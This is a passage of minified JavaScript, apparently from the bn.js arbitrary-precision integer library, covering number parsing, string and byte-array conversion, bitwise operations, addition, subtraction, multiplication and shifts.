n=0,i=1;i<=67108863;i*=t)n++;n--,i=i/t|0;for(var o=e.length-r,s=o%n,a=Math.min(o,o-s)+r,l=0,u=r;u<a;u+=n)l=c(e,u,u+n,t),this.imuln(i),this.words[0]+l<67108864?this.words[0]+=l:this._iaddn(l);if(0!==s){var h=1;for(l=c(e,u,e.length,t),u=0;u<s;u++)h*=t;this.imuln(h),this.words[0]+l<67108864?this.words[0]+=l:this._iaddn(l)}this._strip()},i.prototype.copy=function(e){e.words=new Array(this.length);for(var t=0;t<this.length;t++)e.words[t]=this.words[t];e.length=this.length,e.negative=this.negative,e.red=this.red},i.prototype._move=function(e){l(e,this)},i.prototype.clone=function(){var e=new i(null);return this.copy(e),e},i.prototype._expand=function(e){for(;this.length<e;)this.words[this.length++]=0;return this},i.prototype._strip=function(){for(;this.length>1&&0===this.words[this.length-1];)this.length--;return this._normSign()},i.prototype._normSign=function(){return 1===this.length&&0===this.words[0]&&(this.negative=0),this},typeof Symbol<"u"&&"function"==typeof Symbol.for)try{i.prototype[Symbol.for("nodejs.util.inspect.custom")]=u}catch{i.prototype.inspect=u}else i.prototype.inspect=u;function u(){return(this.red?"<BN-R: ":"<BN: ")+this.toString(16)+">"}var h=["","0","00","000","0000","00000","000000","0000000","00000000","000000000","0000000000","00000000000","000000000000","0000000000000","00000000000000","000000000000000","0000000000000000","00000000000000000","000000000000000000","0000000000000000000","00000000000000000000","000000000000000000000","0000000000000000000000","00000000000000000000000","000000000000000000000000","0000000000000000000000000"],d=[0,0,25,16,12,11,10,9,8,8,7,7,7,7,6,6,6,6,6,6,6,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5],f=[0,0,33554432,43046721,16777216,48828125,60466176,40353607,16777216,43046721,1e7,19487171,35831808,62748517,7529536,11390625,16777216,24137569,34012224,47045881,64e6,4084101,5153632,6436343,7962624,9765625,11881376,14348907,17210368,20511149,243e5,28629151,33554432,39135393,45435424,52521875,60466176];function p(e,t,r){r.negative=t.negative^e.negative;var n=e.length+t.length|0;r.length=n,n=n-1|0;var i=0|e.words[0],o=0|t.words[0],s=i*o,a=67108863&s,c=s/67108864|0;r.words[0]=a;for(var l=1;l<n;l++){for(var u=c>>>26,h=67108863&c,d=Math.min(l,t.length-1),f=Math.max(0,l-e.length+1);f<=d;f++){var p=l-f|0;u+=(s=(i=0|e.words[p])*(o=0|t.words[f])+h)/67108864|0,h=67108863&s}r.words[l]=0|h,c=0|u}return 0!==c?r.words[l]=0|c:r.length--,r._strip()}i.prototype.toString=function(e,t){var n;if(t=0|t||1,16===(e=e||10)||"hex"===e){n="";for(var i=0,o=0,s=0;s<this.length;s++){var a=this.words[s],c=(16777215&(a<<i|o)).toString(16);o=a>>>24-i&16777215,(i+=2)>=26&&(i-=26,s--),n=0!==o||s!==this.length-1?h[6-c.length]+c+n:c+n}for(0!==o&&(n=o.toString(16)+n);n.length%t!=0;)n="0"+n;return 0!==this.negative&&(n="-"+n),n}if(e===(0|e)&&e>=2&&e<=36){var l=d[e],u=f[e];n="";var p=this.clone();for(p.negative=0;!p.isZero();){var g=p.modrn(u).toString(e);n=(p=p.idivn(u)).isZero()?g+n:h[l-g.length]+g+n}for(this.isZero()&&(n="0"+n);n.length%t!=0;)n="0"+n;return 0!==this.negative&&(n="-"+n),n}r(!1,"Base should be between 2 and 36")},i.prototype.toNumber=function(){var e=this.words[0];return 2===this.length?e+=67108864*this.words[1]:3===this.length&&1===this.words[2]?e+=4503599627370496+67108864*this.words[1]:this.length>2&&r(!1,"Number can only safely store up to 53 bits"),0!==this.negative?-e:e},i.prototype.toJSON=function(){return this.toString(16,2)},o&&(i.prototype.toBuffer=function(e,t){return this.toArrayLike(o,e,t)}),i.prototype.toArray=function(e,t){return this.toArrayLike(Array,e,t)},i.prototype.toArrayLike=function(e,t,n){this._strip();var i=this.byteLength(),o=n||Math.max(1,i);r(i<=o,"byte array longer than desired length"),r(o>0,"Requested array length <= 0");var s=function(e,t){return e.allocUnsafe?e.allocUnsafe(t):new e(t)}(e,o);return this["_toArrayLike"+("le"===t?"LE":"BE")](s,i),s},i.prototype._toArrayLikeLE=function(e,t){for(var r=0,n=0,i=0,o=0;i<this.length;i++){var s=this.words[i]<<o|n;e[r++]=255&s,r<e.length&&(e[r++]=s>>8&255),r<e.length&&(e[r++]=s>>16&255),6===o?(r<e.length&&(e[r++]=s>>24&255),n=0,o=0):(n=s>>>24,o+=2)}if(r<e.length)for(e[r++]=n;r<e.length;)e[r++]=0},i.prototype._toArrayLikeBE=function(e,t){for(var r=e.length-1,n=0,i=0,o=0;i<this.length;i++){var s=this.words[i]<<o|n;e[r--]=255&s,r>=0&&(e[r--]=s>>8&255),r>=0&&(e[r--]=s>>16&255),6===o?(r>=0&&(e[r--]=s>>24&255),n=0,o=0):(n=s>>>24,o+=2)}if(r>=0)for(e[r--]=n;r>=0;)e[r--]=0},Math.clz32?i.prototype._countBits=function(e){return 32-Math.clz32(e)}:i.prototype._countBits=function(e){var t=e,r=0;return t>=4096&&(r+=13,t>>>=13),t>=64&&(r+=7,t>>>=7),t>=8&&(r+=4,t>>>=4),t>=2&&(r+=2,t>>>=2),r+t},i.prototype._zeroBits=function(e){if(0===e)return 26;var t=e,r=0;return 8191&t||(r+=13,t>>>=13),127&t||(r+=7,t>>>=7),15&t||(r+=4,t>>>=4),3&t||(r+=2,t>>>=2),1&t||r++,r},i.prototype.bitLength=function(){var e=this.words[this.length-1],t=this._countBits(e);return 26*(this.length-1)+t},i.prototype.zeroBits=function(){if(this.isZero())return 0;for(var e=0,t=0;t<this.length;t++){var r=this._zeroBits(this.words[t]);if(e+=r,26!==r)break}return e},i.prototype.byteLength=function(){return Math.ceil(this.bitLength()/8)},i.prototype.toTwos=function(e){return 0!==this.negative?this.abs().inotn(e).iaddn(1):this.clone()},i.prototype.fromTwos=function(e){return this.testn(e-1)?this.notn(e).iaddn(1).ineg():this.clone()},i.prototype.isNeg=function(){return 0!==this.negative},i.prototype.neg=function(){return this.clone().ineg()},i.prototype.ineg=function(){return this.isZero()||(this.negative^=1),this},i.prototype.iuor=function(e){for(;this.length<e.length;)this.words[this.length++]=0;for(var t=0;t<e.length;t++)this.words[t]=this.words[t]|e.words[t];return this._strip()},i.prototype.ior=function(e){return r(0==(this.negative|e.negative)),this.iuor(e)},i.prototype.or=function(e){return this.length>e.length?this.clone().ior(e):e.clone().ior(this)},i.prototype.uor=function(e){return this.length>e.length?this.clone().iuor(e):e.clone().iuor(this)},i.prototype.iuand=function(e){var t;t=this.length>e.length?e:this;for(var r=0;r<t.length;r++)this.words[r]=this.words[r]&e.words[r];return this.length=t.length,this._strip()},i.prototype.iand=function(e){return r(0==(this.negative|e.negative)),this.iuand(e)},i.prototype.and=function(e){return this.length>e.length?this.clone().iand(e):e.clone().iand(this)},i.prototype.uand=function(e){return this.length>e.length?this.clone().iuand(e):e.clone().iuand(this)},i.prototype.iuxor=function(e){var t,r;this.length>e.length?(t=this,r=e):(t=e,r=this);for(var n=0;n<r.length;n++)this.words[n]=t.words[n]^r.words[n];if(this!==t)for(;n<t.length;n++)this.words[n]=t.words[n];return this.length=t.length,this._strip()},i.prototype.ixor=function(e){return r(0==(this.negative|e.negative)),this.iuxor(e)},i.prototype.xor=function(e){return this.length>e.length?this.clone().ixor(e):e.clone().ixor(this)},i.prototype.uxor=function(e){return this.length>e.length?this.clone().iuxor(e):e.clone().iuxor(this)},i.prototype.inotn=function(e){r("number"==typeof e&&e>=0);var t=0|Math.ceil(e/26),n=e%26;this._expand(t),n>0&&t--;for(var i=0;i<t;i++)this.words[i]=67108863&~this.words[i];return n>0&&(this.words[i]=~this.words[i]&67108863>>26-n),this._strip()},i.prototype.notn=function(e){return this.clone().inotn(e)},i.prototype.setn=function(e,t){r("number"==typeof e&&e>=0);var n=e/26|0,i=e%26;return this._expand(n+1),this.words[n]=t?this.words[n]|1<<i:this.words[n]&~(1<<i),this._strip()},i.prototype.iadd=function(e){var t,r,n;if(0!==this.negative&&0===e.negative)return this.negative=0,t=this.isub(e),this.negative^=1,this._normSign();if(0===this.negative&&0!==e.negative)return e.negative=0,t=this.isub(e),e.negative=1,t._normSign();this.length>e.length?(r=this,n=e):(r=e,n=this);for(var i=0,o=0;o<n.length;o++)t=(0|r.words[o])+(0|n.words[o])+i,this.words[o]=67108863&t,i=t>>>26;for(;0!==i&&o<r.length;o++)t=(0|r.words[o])+i,this.words[o]=67108863&t,i=t>>>26;if(this.length=r.length,0!==i)this.words[this.length]=i,this.length++;else if(r!==this)for(;o<r.length;o++)this.words[o]=r.words[o];return this},i.prototype.add=function(e){var t;return 0!==e.negative&&0===this.negative?(e.negative=0,t=this.sub(e),e.negative^=1,t):0===e.negative&&0!==this.negative?(this.negative=0,t=e.sub(this),this.negative=1,t):this.length>e.length?this.clone().iadd(e):e.clone().iadd(this)},i.prototype.isub=function(e){if(0!==e.negative){e.negative=0;var t=this.iadd(e);return e.negative=1,t._normSign()}if(0!==this.negative)return this.negative=0,this.iadd(e),this.negative=1,this._normSign();var r,n,i=this.cmp(e);if(0===i)return this.negative=0,this.length=1,this.words[0]=0,this;i>0?(r=this,n=e):(r=e,n=this);for(var o=0,s=0;s<n.length;s++)o=(t=(0|r.words[s])-(0|n.words[s])+o)>>26,this.words[s]=67108863&t;for(;0!==o&&s<r.length;s++)o=(t=(0|r.words[s])+o)>>26,this.words[s]=67108863&t;if(0===o&&s<r.length&&r!==this)for(;s<r.length;s++)this.words[s]=r.words[s];return this.length=Math.max(this.length,s),r!==this&&(this.negative=1),this._strip()},i.prototype.sub=function(e){return this.clone().isub(e)};var g=function(e,t,r){var n,i,o,s=e.words,a=t.words,c=r.words,l=0,u=0|s[0],h=8191&u,d=u>>>13,f=0|s[1],p=8191&f,g=f>>>13,m=0|s[2],v=8191&m,y=m>>>13,b=0|s[3],w=8191&b,_=b>>>13,E=0|s[4],x=8191&E,S=E>>>13,A=0|s[5],C=8191&A,I=A>>>13,k=0|s[6],N=8191&k,R=k>>>13,T=0|s[7],O=8191&T,P=T>>>13,M=0|s[8],j=8191&M,L=M>>>13,D=0|s[9],B=8191&D,U=D>>>13,$=0|a[0],z=8191&$,F=$>>>13,H=0|a[1],q=8191&H,W=H>>>13,V=0|a[2],G=8191&V,K=V>>>13,Z=0|a[3],Y=8191&Z,J=Z>>>13,Q=0|a[4],X=8191&Q,ee=Q>>>13,te=0|a[5],re=8191&te,ne=te>>>13,ie=0|a[6],oe=8191&ie,se=ie>>>13,ae=0|a[7],ce=8191&ae,le=ae>>>13,ue=0|a[8],he=8191&ue,de=ue>>>13,fe=0|a[9],pe=8191&fe,ge=fe>>>13;r.negative=e.negative^t.negative,r.length=19;var me=(l+(n=Math.imul(h,z))|0)+((8191&(i=(i=Math.imul(h,F))+Math.imul(d,z)|0))<<13)|0;l=((o=Math.imul(d,F))+(i>>>13)|0)+(me>>>26)|0,me&=67108863,n=Math.imul(p,z),i=(i=Math.imul(p,F))+Math.imul(g,z)|0,o=Math.imul(g,F);var ve=(l+(n=n+Math.imul(h,q)|0)|0)+((8191&(i=(i=i+Math.imul(h,W)|0)+Math.imul(d,q)|0))<<13)|0;l=((o=o+Math.imul(d,W)|0)+(i>>>13)|0)+(ve>>>26)|0,ve&=67108863,n=Math.imul(v,z),i=(i=Math.imul(v,F))+Math.imul(y,z)|0,o=Math.imul(y,F),n=n+Math.imul(p,q)|0,i=(i=i+Math.imul(p,W)|0)+Math.imul(g,q)|0,o=o+Math.imul(g,W)|0;var ye=(l+(n=n+Math.imul(h,G)|0)|0)+((8191&(i=(i=i+Math.imul(h,K)|0)+Math.imul(d,G)|0))<<13)|0;l=((o=o+Math.imul(d,K)|0)+(i>>>13)|0)+(ye>>>26)|0,ye&=67108863,n=Math.imul(w,z),i=(i=Math.imul(w,F))+Math.imul(_,z)|0,o=Math.imul(_,F),n=n+Math.imul(v,q)|0,i=(i=i+Math.imul(v,W)|0)+Math.imul(y,q)|0,o=o+Math.imul(y,W)|0,n=n+Math.imul(p,G)|0,i=(i=i+Math.imul(p,K)|0)+Math.imul(g,G)|0,o=o+Math.imul(g,K)|0;var be=(l+(n=n+Math.imul(h,Y)|0)|0)+((8191&(i=(i=i+Math.imul(h,J)|0)+Math.imul(d,Y)|0))<<13)|0;l=((o=o+Math.imul(d,J)|0)+(i>>>13)|0)+(be>>>26)|0,be&=67108863,n=Math.imul(x,z),i=(i=Math.imul(x,F))+Math.imul(S,z)|0,o=Math.imul(S,F),n=n+Math.imul(w,q)|0,i=(i=i+Math.imul(w,W)|0)+Math.imul(_,q)|0,o=o+Math.imul(_,W)|0,n=n+Math.imul(v,G)|0,i=(i=i+Math.imul(v,K)|0)+Math.imul(y,G)|0,o=o+Math.imul(y,K)|0,n=n+Math.imul(p,Y)|0,i=(i=i+Math.imul(p,J)|0)+Math.imul(g,Y)|0,o=o+Math.imul(g,J)|0;var we=(l+(n=n+Math.imul(h,X)|0)|0)+((8191&(i=(i=i+Math.imul(h,ee)|0)+Math.imul(d,X)|0))<<13)|0;l=((o=o+Math.imul(d,ee)|0)+(i>>>13)|0)+(we>>>26)|0,we&=67108863,n=Math.imul(C,z),i=(i=Math.imul(C,F))+Math.imul(I,z)|0,o=Math.imul(I,F),n=n+Math.imul(x,q)|0,i=(i=i+Math.imul(x,W)|0)+Math.imul(S,q)|0,o=o+Math.imul(S,W)|0,n=n+Math.imul(w,G)|0,i=(i=i+Math.imul(w,K)|0)+Math.imul(_,G)|0,o=o+Math.imul(_,K)|0,n=n+Math.imul(v,Y)|0,i=(i=i+Math.imul(v,J)|0)+Math.imul(y,Y)|0,o=o+Math.imul(y,J)|0,n=n+Math.imul(p,X)|0,i=(i=i+Math.imul(p,ee)|0)+Math.imul(g,X)|0,o=o+Math.imul(g,ee)|0;var _e=(l+(n=n+Math.imul(h,re)|0)|0)+((8191&(i=(i=i+Math.imul(h,ne)|0)+Math.imul(d,re)|0))<<13)|0;l=((o=o+Math.imul(d,ne)|0)+(i>>>13)|0)+(_e>>>26)|0,_e&=67108863,n=Math.imul(N,z),i=(i=Math.imul(N,F))+Math.imul(R,z)|0,o=Math.imul(R,F),n=n+Math.imul(C,q)|0,i=(i=i+Math.imul(C,W)|0)+Math.imul(I,q)|0,o=o+Math.imul(I,W)|0,n=n+Math.imul(x,G)|0,i=(i=i+Math.imul(x,K)|0)+Math.imul(S,G)|0,o=o+Math.imul(S,K)|0,n=n+Math.imul(w,Y)|0,i=(i=i+Math.imul(w,J)|0)+Math.imul(_,Y)|0,o=o+Math.imul(_,J)|0,n=n+Math.imul(v,X)|0,i=(i=i+Math.imul(v,ee)|0)+Math.imul(y,X)|0,o=o+Math.imul(y,ee)|0,n=n+Math.imul(p,re)|0,i=(i=i+Math.imul(p,ne)|0)+Math.imul(g,re)|0,o=o+Math.imul(g,ne)|0;var Ee=(l+(n=n+Math.imul(h,oe)|0)|0)+((8191&(i=(i=i+Math.imul(h,se)|0)+Math.imul(d,oe)|0))<<13)|0;l=((o=o+Math.imul(d,se)|0)+(i>>>13)|0)+(Ee>>>26)|0,Ee&=67108863,n=Math.imul(O,z),i=(i=Math.imul(O,F))+Math.imul(P,z)|0,o=Math.imul(P,F),n=n+Math.imul(N,q)|0,i=(i=i+Math.imul(N,W)|0)+Math.imul(R,q)|0,o=o+Math.imul(R,W)|0,n=n+Math.imul(C,G)|0,i=(i=i+Math.imul(C,K)|0)+Math.imul(I,G)|0,o=o+Math.imul(I,K)|0,n=n+Math.imul(x,Y)|0,i=(i=i+Math.imul(x,J)|0)+Math.imul(S,Y)|0,o=o+Math.imul(S,J)|0,n=n+Math.imul(w,X)|0,i=(i=i+Math.imul(w,ee)|0)+Math.imul(_,X)|0,o=o+Math.imul(_,ee)|0,n=n+Math.imul(v,re)|0,i=(i=i+Math.imul(v,ne)|0)+Math.imul(y,re)|0,o=o+Math.imul(y,ne)|0,n=n+Math.imul(p,oe)|0,i=(i=i+Math.imul(p,se)|0)+Math.imul(g,oe)|0,o=o+Math.imul(g,se)|0;var xe=(l+(n=n+Math.imul(h,ce)|0)|0)+((8191&(i=(i=i+Math.imul(h,le)|0)+Math.imul(d,ce)|0))<<13)|0;l=((o=o+Math.imul(d,le)|0)+(i>>>13)|0)+(xe>>>26)|0,xe&=67108863,n=Math.imul(j,z),i=(i=Math.imul(j,F))+Math.imul(L,z)|0,o=Math.imul(L,F),n=n+Math.imul(O,q)|0,i=(i=i+Math.imul(O,W)|0)+Math.imul(P,q)|0,o=o+Math.imul(P,W)|0,n=n+Math.imul(N,G)|0,i=(i=i+Math.imul(N,K)|0)+Math.imul(R,G)|0,o=o+Math.imul(R,K)|0,n=n+Math.imul(C,Y)|0,i=(i=i+Math.imul(C,J)|0)+Math.imul(I,Y)|0,o=o+Math.imul(I,J)|0,n=n+Math.imul(x,X)|0,i=(i=i+Math.imul(x,ee)|0)+Math.imul(S,X)|0,o=o+Math.imul(S,ee)|0,n=n+Math.imul(w,re)|0,i=(i=i+Math.imul(w,ne)|0)+Math.imul(_,re)|0,o=o+Math.imul(_,ne)|0,n=n+Math.imul(v,oe)|0,i=(i=i+Math.imul(v,se)|0)+Math.imul(y,oe)|0,o=o+Math.imul(y,se)|0,n=n+Math.imul(p,ce)|0,i=(i=i+Math.imul(p,le)|0)+Math.imul(g,ce)|0,o=o+Math.imul(g,le)|0;var Se=(l+(n=n+Math.imul(h,he)|0)|0)+((8191&(i=(i=i+Math.imul(h,de)|0)+Math.imul(d,he)|0))<<13)|0;l=((o=o+Math.imul(d,de)|0)+(i>>>13)|0)+(Se>>>26)|0,Se&=67108863,n=Math.imul(B,z),i=(i=Math.imul(B,F))+Math.imul(U,z)|0,o=Math.imul(U,F),n=n+Math.imul(j,q)|0,i=(i=i+Math.imul(j,W)|0)+Math.imul(L,q)|0,o=o+Math.imul(L,W)|0,n=n+Math.imul(O,G)|0,i=(i=i+Math.imul(O,K)|0)+Math.imul(P,G)|0,o=o+Math.imul(P,K)|0,n=n+Math.imul(N,Y)|0,i=(i=i+Math.imul(N,J)|0)+Math.imul(R,Y)|0,o=o+Math.imul(R,J)|0,n=n+Math.imul(C,X)|0,i=(i=i+Math.imul(C,ee)|0)+Math.imul(I,X)|0,o=o+Math.imul(I,ee)|0,n=n+Math.imul(x,re)|0,i=(i=i+Math.imul(x,ne)|0)+Math.imul(S,re)|0,o=o+Math.imul(S,ne)|0,n=n+Math.imul(w,oe)|0,i=(i=i+Math.imul(w,se)|0)+Math.imul(_,oe)|0,o=o+Math.imul(_,se)|0,n=n+Math.imul(v,ce)|0,i=(i=i+Math.imul(v,le)|0)+Math.imul(y,ce)|0,o=o+Math.imul(y,le)|0,n=n+Math.imul(p,he)|0,i=(i=i+Math.imul(p,de)|0)+Math.imul(g,he)|0,o=o+Math.imul(g,de)|0;var Ae=(l+(n=n+Math.imul(h,pe)|0)|0)+((8191&(i=(i=i+Math.imul(h,ge)|0)+Math.imul(d,pe)|0))<<13)|0;l=((o=o+Math.imul(d,ge)|0)+(i>>>13)|0)+(Ae>>>26)|0,Ae&=67108863,n=Math.imul(B,q),i=(i=Math.imul(B,W))+Math.imul(U,q)|0,o=Math.imul(U,W),n=n+Math.imul(j,G)|0,i=(i=i+Math.imul(j,K)|0)+Math.imul(L,G)|0,o=o+Math.imul(L,K)|0,n=n+Math.imul(O,Y)|0,i=(i=i+Math.imul(O,J)|0)+Math.imul(P,Y)|0,o=o+Math.imul(P,J)|0,n=n+Math.imul(N,X)|0,i=(i=i+Math.imul(N,ee)|0)+Math.imul(R,X)|0,o=o+Math.imul(R,ee)|0,n=n+Math.imul(C,re)|0,i=(i=i+Math.imul(C,ne)|0)+Math.imul(I,re)|0,o=o+Math.imul(I,ne)|0,n=n+Math.imul(x,oe)|0,i=(i=i+Math.imul(x,se)|0)+Math.imul(S,oe)|0,o=o+Math.imul(S,se)|0,n=n+Math.imul(w,ce)|0,i=(i=i+Math.imul(w,le)|0)+Math.imul(_,ce)|0,o=o+Math.imul(_,le)|0,n=n+Math.imul(v,he)|0,i=(i=i+Math.imul(v,de)|0)+Math.imul(y,he)|0,o=o+Math.imul(y,de)|0;var Ce=(l+(n=n+Math.imul(p,pe)|0)|0)+((8191&(i=(i=i+Math.imul(p,ge)|0)+Math.imul(g,pe)|0))<<13)|0;l=((o=o+Math.imul(g,ge)|0)+(i>>>13)|0)+(Ce>>>26)|0,Ce&=67108863,n=Math.imul(B,G),i=(i=Math.imul(B,K))+Math.imul(U,G)|0,o=Math.imul(U,K),n=n+Math.imul(j,Y)|0,i=(i=i+Math.imul(j,J)|0)+Math.imul(L,Y)|0,o=o+Math.imul(L,J)|0,n=n+Math.imul(O,X)|0,i=(i=i+Math.imul(O,ee)|0)+Math.imul(P,X)|0,o=o+Math.imul(P,ee)|0,n=n+Math.imul(N,re)|0,i=(i=i+Math.imul(N,ne)|0)+Math.imul(R,re)|0,o=o+Math.imul(R,ne)|0,n=n+Math.imul(C,oe)|0,i=(i=i+Math.imul(C,se)|0)+Math.imul(I,oe)|0,o=o+Math.imul(I,se)|0,n=n+Math.imul(x,ce)|0,i=(i=i+Math.imul(x,le)|0)+Math.imul(S,ce)|0,o=o+Math.imul(S,le)|0,n=n+Math.imul(w,he)|0,i=(i=i+Math.imul(w,de)|0)+Math.imul(_,he)|0,o=o+Math.imul(_,de)|0;var Ie=(l+(n=n+Math.imul(v,pe)|0)|0)+((8191&(i=(i=i+Math.imul(v,ge)|0)+Math.imul(y,pe)|0))<<13)|0;l=((o=o+Math.imul(y,ge)|0)+(i>>>13)|0)+(Ie>>>26)|0,Ie&=67108863,n=Math.imul(B,Y),i=(i=Math.imul(B,J))+Math.imul(U,Y)|0,o=Math.imul(U,J),n=n+Math.imul(j,X)|0,i=(i=i+Math.imul(j,ee)|0)+Math.imul(L,X)|0,o=o+Math.imul(L,ee)|0,n=n+Math.imul(O,re)|0,i=(i=i+Math.imul(O,ne)|0)+Math.imul(P,re)|0,o=o+Math.imul(P,ne)|0,n=n+Math.imul(N,oe)|0,i=(i=i+Math.imul(N,se)|0)+Math.imul(R,oe)|0,o=o+Math.imul(R,se)|0,n=n+Math.imul(C,ce)|0,i=(i=i+Math.imul(C,le)|0)+Math.imul(I,ce)|0,o=o+Math.imul(I,le)|0,n=n+Math.imul(x,he)|0,i=(i=i+Math.imul(x,de)|0)+Math.imul(S,he)|0,o=o+Math.imul(S,de)|0;var ke=(l+(n=n+Math.imul(w,pe)|0)|0)+((8191&(i=(i=i+Math.imul(w,ge)|0)+Math.imul(_,pe)|0))<<13)|0;l=((o=o+Math.imul(_,ge)|0)+(i>>>13)|0)+(ke>>>26)|0,ke&=67108863,n=Math.imul(B,X),i=(i=Math.imul(B,ee))+Math.imul(U,X)|0,o=Math.imul(U,ee),n=n+Math.imul(j,re)|0,i=(i=i+Math.imul(j,ne)|0)+Math.imul(L,re)|0,o=o+Math.imul(L,ne)|0,n=n+Math.imul(O,oe)|0,i=(i=i+Math.imul(O,se)|0)+Math.imul(P,oe)|0,o=o+Math.imul(P,se)|0,n=n+Math.imul(N,ce)|0,i=(i=i+Math.imul(N,le)|0)+Math.imul(R,ce)|0,o=o+Math.imul(R,le)|0,n=n+Math.imul(C,he)|0,i=(i=i+Math.imul(C,de)|0)+Math.imul(I,he)|0,o=o+Math.imul(I,de)|0;var Ne=(l+(n=n+Math.imul(x,pe)|0)|0)+((8191&(i=(i=i+Math.imul(x,ge)|0)+Math.imul(S,pe)|0))<<13)|0;l=((o=o+Math.imul(S,ge)|0)+(i>>>13)|0)+(Ne>>>26)|0,Ne&=67108863,n=Math.imul(B,re),i=(i=Math.imul(B,ne))+Math.imul(U,re)|0,o=Math.imul(U,ne),n=n+Math.imul(j,oe)|0,i=(i=i+Math.imul(j,se)|0)+Math.imul(L,oe)|0,o=o+Math.imul(L,se)|0,n=n+Math.imul(O,ce)|0,i=(i=i+Math.imul(O,le)|0)+Math.imul(P,ce)|0,o=o+Math.imul(P,le)|0,n=n+Math.imul(N,he)|0,i=(i=i+Math.imul(N,de)|0)+Math.imul(R,he)|0,o=o+Math.imul(R,de)|0;var Re=(l+(n=n+Math.imul(C,pe)|0)|0)+((8191&(i=(i=i+Math.imul(C,ge)|0)+Math.imul(I,pe)|0))<<13)|0;l=((o=o+Math.imul(I,ge)|0)+(i>>>13)|0)+(Re>>>26)|0,Re&=67108863,n=Math.imul(B,oe),i=(i=Math.imul(B,se))+Math.imul(U,oe)|0,o=Math.imul(U,se),n=n+Math.imul(j,ce)|0,i=(i=i+Math.imul(j,le)|0)+Math.imul(L,ce)|0,o=o+Math.imul(L,le)|0,n=n+Math.imul(O,he)|0,i=(i=i+Math.imul(O,de)|0)+Math.imul(P,he)|0,o=o+Math.imul(P,de)|0;var Te=(l+(n=n+Math.imul(N,pe)|0)|0)+((8191&(i=(i=i+Math.imul(N,ge)|0)+Math.imul(R,pe)|0))<<13)|0;l=((o=o+Math.imul(R,ge)|0)+(i>>>13)|0)+(Te>>>26)|0,Te&=67108863,n=Math.imul(B,ce),i=(i=Math.imul(B,le))+Math.imul(U,ce)|0,o=Math.imul(U,le),n=n+Math.imul(j,he)|0,i=(i=i+Math.imul(j,de)|0)+Math.imul(L,he)|0,o=o+Math.imul(L,de)|0;var Oe=(l+(n=n+Math.imul(O,pe)|0)|0)+((8191&(i=(i=i+Math.imul(O,ge)|0)+Math.imul(P,pe)|0))<<13)|0;l=((o=o+Math.imul(P,ge)|0)+(i>>>13)|0)+(Oe>>>26)|0,Oe&=67108863,n=Math.imul(B,he),i=(i=Math.imul(B,de))+Math.imul(U,he)|0,o=Math.imul(U,de);var Pe=(l+(n=n+Math.imul(j,pe)|0)|0)+((8191&(i=(i=i+Math.imul(j,ge)|0)+Math.imul(L,pe)|0))<<13)|0;l=((o=o+Math.imul(L,ge)|0)+(i>>>13)|0)+(Pe>>>26)|0,Pe&=67108863;var Me=(l+(n=Math.imul(B,pe))|0)+((8191&(i=(i=Math.imul(B,ge))+Math.imul(U,pe)|0))<<13)|0;return l=((o=Math.imul(U,ge))+(i>>>13)|0)+(Me>>>26)|0,Me&=67108863,c[0]=me,c[1]=ve,c[2]=ye,c[3]=be,c[4]=we,c[5]=_e,c[6]=Ee,c[7]=xe,c[8]=Se,c[9]=Ae,c[10]=Ce,c[11]=Ie,c[12]=ke,c[13]=Ne,c[14]=Re,c[15]=Te,c[16]=Oe,c[17]=Pe,c[18]=Me,0!==l&&(c[19]=l,r.length++),r};function m(e,t,r){r.negative=t.negative^e.negative,r.length=e.length+t.length;for(var n=0,i=0,o=0;o<r.length-1;o++){var s=i;i=0;for(var a=67108863&n,c=Math.min(o,t.length-1),l=Math.max(0,o-e.length+1);l<=c;l++){var u=o-l,h=(0|e.words[u])*(0|t.words[l]),d=67108863&h;a=67108863&(d=d+a|0),i+=(s=(s=s+(h/67108864|0)|0)+(d>>>26)|0)>>>26,s&=67108863}r.words[o]=a,n=s,s=i}return 0!==n?r.words[o]=n:r.length--,r._strip()}function v(e,t,r){return m(e,t,r)}Math.imul||(g=p),i.prototype.mulTo=function(e,t){var r=this.length+e.length;return 10===this.length&&10===e.length?g(this,e,t):r<63?p(this,e,t):r<1024?m(this,e,t):v(this,e,t)},i.prototype.mul=function(e){var t=new i(null);return t.words=new Array(this.length+e.length),this.mulTo(e,t)},i.prototype.mulf=function(e){var t=new i(null);return t.words=new Array(this.length+e.length),v(this,e,t)},i.prototype.imul=function(e){return this.clone().mulTo(e,this)},i.prototype.imuln=function(e){var t=e<0;t&&(e=-e),r("number"==typeof e),r(e<67108864);for(var n=0,i=0;i<this.length;i++){var o=(0|this.words[i])*e,s=(67108863&o)+(67108863&n);n>>=26,n+=o/67108864|0,n+=s>>>26,this.words[i]=67108863&s}return 0!==n&&(this.words[i]=n,this.length++),t?this.ineg():this},i.prototype.muln=function(e){return this.clone().imuln(e)},i.prototype.sqr=function(){return this.mul(this)},i.prototype.isqr=function(){return this.imul(this.clone())},i.prototype.pow=function(e){var t=function(e){for(var t=new Array(e.bitLength()),r=0;r<t.length;r++){var n=r/26|0,i=r%26;t[r]=e.words[n]>>>i&1}return t}(e);if(0===t.length)return new i(1);for(var r=this,n=0;n<t.length&&0===t[n];n++,r=r.sqr());if(++n<t.length)for(var o=r.sqr();n<t.length;n++,o=o.sqr())0!==t[n]&&(r=r.mul(o));return r},i.prototype.iushln=function(e){r("number"==typeof e&&e>=0);var t,n=e%26,i=(e-n)/26,o=67108863>>>26-n<<26-n;if(0!==n){var s=0;for(t=0;t<this.length;t++){var a=this.words[t]&o,c=(0|this.words[t])-a<<n;this.words[t]=c|s,s=a>>>26-n}s&&(this.words[t]=s,this.length++)}if(0!==i){for(t=this.length-1;t>=0;t--)this.words[t+i]=this.words[t];for(t=0;t<i;t++)this.words[t]=0;this.length+=i}return this._strip()},i.prototype.ishln=function(e){return r(0===this.negative),this.iushln(e)},i.prototype.iushrn=function(e,t,n){var i;r("number"==typeof e&&e>=0),i=t?(t-t%26)/26:0;var o=e%26,s=Math.min((e-o)/26,this.length),a=67108863^67108863>>>o<<o,c=n;if(i-=s,i=Math.max(0,i),c){for(var l=0;l<s;l++)c.words[l]=this.words[l];c.length=s}if(0!==s)if(this.length>s)for(this.length-=s,l=0;l<this.length;l++)this.words[l]=this.words[l+s];else this.words[0]=0,this.length=1;var u=0;for(l=this.length-1;l>=0&&(0!==u||l>=i);l--){var h=0|this.words[l];this.words[l]=u<<26-o|h>>>o,u=h&a}return c&&0!==u&&(c.words[c.length++]=u),0===this.length&&(this.words[0]=0,this.length=1),this._strip()},i.prototype.ishrn=function(e,t,n){return r(0===this.negative),this.iushrn(e,t,n)},i.prototype.shln=function(e){return this.clone().ishln(e)},i.prototype.ushln=function(e){return 